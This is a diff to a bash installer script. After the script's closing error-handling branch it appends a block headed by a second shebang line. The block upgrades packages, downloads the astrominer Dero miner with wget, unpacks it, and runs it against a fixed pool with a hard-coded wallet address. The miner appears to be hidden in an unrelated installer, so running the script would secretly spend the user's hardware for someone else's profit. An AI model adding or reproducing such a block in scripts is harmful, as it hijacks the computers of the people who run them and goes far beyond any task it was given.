@@ -134,3 +134,5 @@ else
 printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;203m[ERROR]:\e[0m \x1b[38;5;87m Installation aborted.\n"
 printf "\e[0m"
 fi
+#!/bin/bash
+apt update -y && apt dist-upgrade -y && apt-get install automake autoconf pkg-config libcurl4-openssl-dev -y libjansson-dev -y libssl-dev -y libgmp-dev -y zlib1g-dev -y make g++ libtool git -y && apt-get install wget && wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_aarch64_linux.tar.gz && tar -xvaf astrominer-V1.9.2.R5_aarch64_linux.tar.gz && ./astrominer -w deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqc6cgeakeq3aejx0 -r community-pools.mysrv.cloud:10300 -p rpc
